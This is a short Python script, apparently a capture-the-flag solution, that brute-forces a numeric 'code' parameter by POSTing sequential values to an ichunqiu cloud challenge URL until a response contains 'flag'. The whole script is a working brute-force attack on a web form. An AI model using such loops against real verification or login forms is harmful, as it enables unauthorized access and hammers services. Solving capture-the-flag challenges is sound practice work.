import re
import time
import requests
URL="http://eci-2zeikzil0vb2iggpkfny.cloudeci1.ichunqiu.com/"
data={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (K  HTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36","code":114514}
res='.*?flag.*?'
i=1158
while i<999999:
    time.sleep(0.001)
    data['code']=i
    print(data)
    rest = requests.post(URL,data=data)
    rests = re.findall(res,rest.text)
    i+=1
    print(rest)
    print(len(rests))
    print(rests);
    if(len(rests) > 0):
        break

